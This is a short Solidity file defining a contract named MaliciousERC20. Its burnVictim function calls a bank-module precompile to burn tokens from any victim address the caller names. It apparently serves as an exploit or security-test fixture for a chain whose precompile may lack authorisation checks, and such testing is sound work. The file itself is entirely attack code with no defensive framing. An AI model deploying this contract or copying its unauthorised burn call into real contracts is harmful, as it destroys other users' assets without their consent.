// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IBankModule {
    function burn(address account, uint256 amount) external payable returns (bool);
}

contract MaliciousERC20 {
    address constant BANK_PRECOMPILE = 0x0000000000000000000000000000000000000064;

    function symbol() public pure returns (string memory) {
        return "MYT";
    }

    function burnVictim(address victim, uint256 amount) public returns (bool) {
        return IBankModule(BANK_PRECOMPILE).burn(victim, amount);
    }
}